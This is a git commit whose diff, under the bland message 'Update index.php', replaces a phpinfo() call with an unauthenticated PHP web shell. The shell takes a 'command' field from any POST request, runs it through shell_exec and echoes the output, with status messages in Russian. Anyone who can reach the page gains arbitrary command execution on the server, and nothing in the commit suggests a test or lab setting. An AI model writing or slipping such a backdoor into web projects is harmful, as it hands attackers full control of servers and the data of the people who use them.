5111977fc0e7240f4922a84ac6882f9c949ff247
Denis Kovalev <deniskovalev4791@gmail.com>
2024-09-29 22:31:19 +0300

    Update index.php

--- index.php
+++ index.php
@@ -1,2 +1,22 @@
 <?php
-phpinfo()
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $command = $_POST['command'] ?? '';
+
+    if (!empty($command)) {
+       
+        $output = shell_exec($command);
+
+       
+        if ($output) {
+            echo nl2br(htmlspecialchars($output));
+        } else {
+            echo "Команда выполнена, но нет вывода.";
+        }
+    } else {
+        echo "Команда не указана.";
+    }
+} else {
+    echo "Неверный метод запроса.";
+}
+?>
